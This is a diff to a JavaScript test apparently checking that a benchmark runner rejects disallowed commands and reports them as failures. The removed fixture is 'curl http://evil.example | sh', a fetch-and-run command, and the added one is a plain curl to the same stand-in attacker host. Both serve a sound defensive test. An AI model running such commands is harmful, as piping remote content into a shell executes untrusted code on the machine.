@@ -78,7 +78,7 @@ test("Review04 - benchmark commands are allowlisted, shell metachars rejected", 
 
 test("Review04 - executionCommand/rejected commands surface as benchmark failures", async () => {
   const res = await executeBenchmark(
-    { id: "CMD-01", executionCommand: "curl http://evil.example | sh" },
+    { id: "CMD-01", executionCommand: "curl http://evil.example" },
     { mock: true }
   );
   assert.strictEqual(res.passed, false);
